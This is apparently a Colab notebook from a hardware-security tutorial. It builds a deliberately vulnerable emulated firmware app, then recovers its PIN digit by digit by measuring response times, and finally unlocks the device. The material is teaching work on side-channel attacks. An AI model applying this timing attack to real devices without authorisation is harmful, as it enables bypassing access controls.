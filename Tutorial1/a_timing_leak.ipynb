{
  "nbformat": 4,
  "nbformat_minor": 0,
  "metadata": {
    "colab": {
      "provenance": [],
      "authorship_tag": "ABX9TyMNuNCE4wYo1M5LshwDJJ8A",
      "include_colab_link": true
    },
    "kernelspec": {
      "name": "python3",
      "display_name": "Python 3"
    },
    "language_info": {
      "name": "python"
    }
  },
  "cells": [
    {
      "cell_type": "markdown",
      "metadata": {
        "id": "view-in-github",
        "colab_type": "text"
      },
      "source": [
        "<a href=\"https://colab.research.google.com/github/Jubicod/wsf/blob/main/Tutorial1/a_timing_leak.ipynb\" target=\"_parent\"><img src=\"https://colab.research.google.com/assets/colab-badge.svg\" alt=\"Open In Colab\"/></a>"
      ]
    },
    {
      "cell_type": "markdown",
      "source": [
        "# Exploiting the **timing leak** bug"
      ],
      "metadata": {
        "id": "AOcoMvQs7BDq"
      }
    },
    {
      "cell_type": "code",
      "execution_count": 1,
      "metadata": {
        "colab": {
          "base_uri": "https://localhost:8080/"
        },
        "id": "iCcT6Gre6xjS",
        "outputId": "b3cff0bc-3161-4998-c54e-a278ec16a0ad"
      },
      "outputs": [
        {
          "output_type": "stream",
          "name": "stdout",
          "text": [
            "Cloning into 'wsf'...\n",
            "remote: Enumerating objects: 197, done.\u001b[K\n",
            "remote: Counting objects: 100% (197/197), done.\u001b[K\n",
            "remote: Compressing objects: 100% (132/132), done.\u001b[K\n",
            "remote: Total 197 (delta 76), reused 162 (delta 60), pack-reused 0\u001b[K\n",
            "Receiving objects: 100% (197/197), 164.62 KiB | 6.58 MiB/s, done.\n",
            "Resolving deltas: 100% (76/76), done.\n"
          ]
        }
      ],
      "source": [
        "!git clone https://github.com/Jubicod/wsf.git"
      ]
    },
    {
      "cell_type": "code",
      "source": [
        "%run wsf/tutorial1/install.ipynb"
      ],
      "metadata": {
        "colab": {
          "base_uri": "https://localhost:8080/"
        },
        "id": "f-d__uUL64lU",
        "outputId": "0c931792-f246-4b2f-9928-0df958122fde"
      },
      "execution_count": 2,
      "outputs": [
        {
          "output_type": "stream",
          "name": "stdout",
          "text": [
            "Reading package lists... Done\n",
            "Building dependency tree... Done\n",
            "Reading state information... Done\n",
            "The following additional packages will be installed:\n",
            "  binutils-arm-none-eabi libnewlib-arm-none-eabi libnewlib-dev libstdc++-arm-none-eabi-dev\n",
            "  libstdc++-arm-none-eabi-newlib\n",
            "Suggested packages:\n",
            "  libnewlib-doc\n",
            "The following NEW packages will be installed:\n",
            "  binutils-arm-none-eabi gcc-arm-none-eabi libnewlib-arm-none-eabi libnewlib-dev\n",
            "  libstdc++-arm-none-eabi-dev libstdc++-arm-none-eabi-newlib\n",
            "0 upgraded, 6 newly installed, 0 to remove and 45 not upgraded.\n",
            "Need to get 442 MB of archives.\n",
            "After this operation, 2,575 MB of additional disk space will be used.\n",
            "Get:1 http://archive.ubuntu.com/ubuntu jammy/universe amd64 binutils-arm-none-eabi amd64 2.38-3ubuntu1+15build1 [3,040 kB]\n",
            "Get:2 http://archive.ubuntu.com/ubuntu jammy/universe amd64 gcc-arm-none-eabi amd64 15:10.3-2021.07-4 [47.7 MB]\n",
            "Get:3 http://archive.ubuntu.com/ubuntu jammy/universe amd64 libstdc++-arm-none-eabi-dev all 15:10.3-2021.07-4+17 [1,049 kB]\n",
            "Get:4 http://archive.ubuntu.com/ubuntu jammy/universe amd64 libnewlib-dev all 3.3.0-1.3 [137 kB]\n",
            "Get:5 http://archive.ubuntu.com/ubuntu jammy/universe amd64 libnewlib-arm-none-eabi all 3.3.0-1.3 [43.2 MB]\n",
            "Get:6 http://archive.ubuntu.com/ubuntu jammy/universe amd64 libstdc++-arm-none-eabi-newlib all 15:10.3-2021.07-4+17 [347 MB]\n",
            "Fetched 442 MB in 5s (83.1 MB/s)\n",
            "Selecting previously unselected package binutils-arm-none-eabi.\n",
            "(Reading database ... 121752 files and directories currently installed.)\n",
            "Preparing to unpack .../0-binutils-arm-none-eabi_2.38-3ubuntu1+15build1_amd64.deb ...\n",
            "Unpacking binutils-arm-none-eabi (2.38-3ubuntu1+15build1) ...\n",
            "Selecting previously unselected package gcc-arm-none-eabi.\n",
            "Preparing to unpack .../1-gcc-arm-none-eabi_15%3a10.3-2021.07-4_amd64.deb ...\n",
            "Unpacking gcc-arm-none-eabi (15:10.3-2021.07-4) ...\n",
            "Selecting previously unselected package libstdc++-arm-none-eabi-dev.\n",
            "Preparing to unpack .../2-libstdc++-arm-none-eabi-dev_15%3a10.3-2021.07-4+17_all.deb ...\n",
            "Unpacking libstdc++-arm-none-eabi-dev (15:10.3-2021.07-4+17) ...\n",
            "Selecting previously unselected package libnewlib-dev.\n",
            "Preparing to unpack .../3-libnewlib-dev_3.3.0-1.3_all.deb ...\n",
            "Unpacking libnewlib-dev (3.3.0-1.3) ...\n",
            "Selecting previously unselected package libnewlib-arm-none-eabi.\n",
            "Preparing to unpack .../4-libnewlib-arm-none-eabi_3.3.0-1.3_all.deb ...\n",
            "Unpacking libnewlib-arm-none-eabi (3.3.0-1.3) ...\n",
            "Selecting previously unselected package libstdc++-arm-none-eabi-newlib.\n",
            "Preparing to unpack .../5-libstdc++-arm-none-eabi-newlib_15%3a10.3-2021.07-4+17_all.deb ...\n",
            "Unpacking libstdc++-arm-none-eabi-newlib (15:10.3-2021.07-4+17) ...\n",
            "Setting up binutils-arm-none-eabi (2.38-3ubuntu1+15build1) ...\n",
            "Setting up gcc-arm-none-eabi (15:10.3-2021.07-4) ...\n",
            "Setting up libnewlib-dev (3.3.0-1.3) ...\n",
            "Setting up libnewlib-arm-none-eabi (3.3.0-1.3) ...\n",
            "Setting up libstdc++-arm-none-eabi-dev (15:10.3-2021.07-4+17) ...\n",
            "Setting up libstdc++-arm-none-eabi-newlib (15:10.3-2021.07-4+17) ...\n",
            "Processing triggers for man-db (2.10.2-1) ...\n",
            "Processing triggers for libc-bin (2.35-0ubuntu3.4) ...\n",
            "/sbin/ldconfig.real: /usr/local/lib/libtbb.so.12 is not a symbolic link\n",
            "\n",
            "/sbin/ldconfig.real: /usr/local/lib/libtbbbind_2_5.so.3 is not a symbolic link\n",
            "\n",
            "/sbin/ldconfig.real: /usr/local/lib/libtbbbind.so.3 is not a symbolic link\n",
            "\n",
            "/sbin/ldconfig.real: /usr/local/lib/libtbbmalloc_proxy.so.2 is not a symbolic link\n",
            "\n",
            "/sbin/ldconfig.real: /usr/local/lib/libtbbmalloc.so.2 is not a symbolic link\n",
            "\n",
            "/sbin/ldconfig.real: /usr/local/lib/libtbbbind_2_0.so.3 is not a symbolic link\n",
            "\n",
            "Collecting unicorn\n",
            "  Downloading unicorn-2.0.1.post1-py2.py3-none-manylinux1_x86_64.manylinux_2_17_x86_64.manylinux2014_x86_64.whl (16.1 MB)\n",
            "\u001b[2K     \u001b[90m━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\u001b[0m \u001b[32m16.1/16.1 MB\u001b[0m \u001b[31m72.1 MB/s\u001b[0m eta \u001b[36m0:00:00\u001b[0m\n",
            "\u001b[?25hInstalling collected packages: unicorn\n",
            "Successfully installed unicorn-2.0.1.post1\n",
            "Collecting lief\n",
            "  Downloading lief-0.14.1-cp310-cp310-manylinux_2_28_x86_64.manylinux_2_27_x86_64.whl (2.7 MB)\n",
            "\u001b[2K     \u001b[90m━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\u001b[0m \u001b[32m2.7/2.7 MB\u001b[0m \u001b[31m30.7 MB/s\u001b[0m eta \u001b[36m0:00:00\u001b[0m\n",
            "\u001b[?25hInstalling collected packages: lief\n",
            "Successfully installed lief-0.14.1\n",
            "make: Entering directory '/content/wsf/tutorial1/app'\n",
            "arm-none-eabi-gcc -O1 -g -march=armv7-m startup_stm32f10x_ld.s main.c slots.c --specs=nosys.specs -T stm32_flash.ld -o app.elf\n",
            "arm-none-eabi-objdump -S app.elf > app.txt\n",
            "arm-none-eabi-objdump -x app.elf > app.map\n",
            "make: Leaving directory '/content/wsf/tutorial1/app'\n"
          ]
        }
      ]
    },
    {
      "cell_type": "code",
      "source": [
        "# application has PIN code checking. Is it vulnerable to timing attacks ?\n",
        "app = App()\n",
        "app.send('U1234')\n",
        "# let's measure how it takes to process a simple PIN (0000)\n",
        "# here it's convenient as app.send() returns the time spent by the app\n",
        "print('time for PIN 0000:', app.send('U0000'))"
      ],
      "metadata": {
        "colab": {
          "base_uri": "https://localhost:8080/"
        },
        "id": "yFzDv2T066zx",
        "outputId": "51a9a228-1ace-4059-86e4-66131914059c"
      },
      "execution_count": 11,
      "outputs": [
        {
          "output_type": "stream",
          "name": "stdout",
          "text": [
            "ready...\n",
            "U1234\n",
            "ok\n",
            "U0000\n",
            "ok\n",
            "time for PIN 0000: 149\n"
          ]
        }
      ]
    },
    {
      "cell_type": "code",
      "source": [
        "# now we increment the first digit\n",
        "print('time for PIN 1000:', app.send('U1000'))"
      ],
      "metadata": {
        "colab": {
          "base_uri": "https://localhost:8080/"
        },
        "id": "NHI0WfnB7qU6",
        "outputId": "89261ad0-28c7-45cc-feec-b95e5b823fec"
      },
      "execution_count": 12,
      "outputs": [
        {
          "output_type": "stream",
          "name": "stdout",
          "text": [
            "U1000\n",
            "ok\n",
            "time for PIN 1000: 149\n"
          ]
        }
      ]
    },
    {
      "cell_type": "code",
      "source": [
        "# same time. let's increment again\n",
        "print('time for PIN 2000:', app.send('U2000'))"
      ],
      "metadata": {
        "colab": {
          "base_uri": "https://localhost:8080/"
        },
        "id": "YbSi6mIS9BrL",
        "outputId": "ec3db6b3-eddd-40da-a6d1-8f2cb3c4cf1f"
      },
      "execution_count": 13,
      "outputs": [
        {
          "output_type": "stream",
          "name": "stdout",
          "text": [
            "U2000\n",
            "ok\n",
            "time for PIN 2000: 156\n"
          ]
        }
      ]
    },
    {
      "cell_type": "code",
      "source": [
        "# it took more time. 2 is probably the right answer for the 1 first digit\n",
        "# now we can increment the second digit\n",
        "print('time for PIN 2000:', app.send('U2100'))"
      ],
      "metadata": {
        "colab": {
          "base_uri": "https://localhost:8080/"
        },
        "id": "QHbc0kwzFZYd",
        "outputId": "86136d4b-0087-4377-ecf7-a9f3b24f554d"
      },
      "execution_count": 14,
      "outputs": [
        {
          "output_type": "stream",
          "name": "stdout",
          "text": [
            "U2100\n",
            "ok\n",
            "time for PIN 2000: 156\n"
          ]
        }
      ]
    },
    {
      "cell_type": "code",
      "source": [
        "# ... and so on until we retreive the whole PIN\n",
        "app.send('U2304')\n",
        "app.send('S')"
      ],
      "metadata": {
        "colab": {
          "base_uri": "https://localhost:8080/"
        },
        "id": "XaFOw9tWFrlF",
        "outputId": "828f6ced-69cf-46fa-b3ad-7a3a256c4725"
      },
      "execution_count": 15,
      "outputs": [
        {
          "output_type": "stream",
          "name": "stdout",
          "text": [
            "U2304\n",
            "ok\n",
            "S\n",
            "device unlocked\n",
            "0  RW-L\n",
            "1  RW-L\n",
            "2  RW-L\n",
            "3  R--L\n",
            "4  R-IL\n",
            "5  RW--\n",
            "6  R---\n",
            "7  ----\n",
            "ok\n"
          ]
        },
        {
          "output_type": "execute_result",
          "data": {
            "text/plain": [
              "242"
            ]
          },
          "metadata": {},
          "execution_count": 15
        }
      ]
    },
    {
      "cell_type": "code",
      "source": [
        "# PIN is correct, device is unlocked !!!"
      ],
      "metadata": {
        "id": "Wrb57YwqF5BE"
      },
      "execution_count": null,
      "outputs": []
    }
  ]
}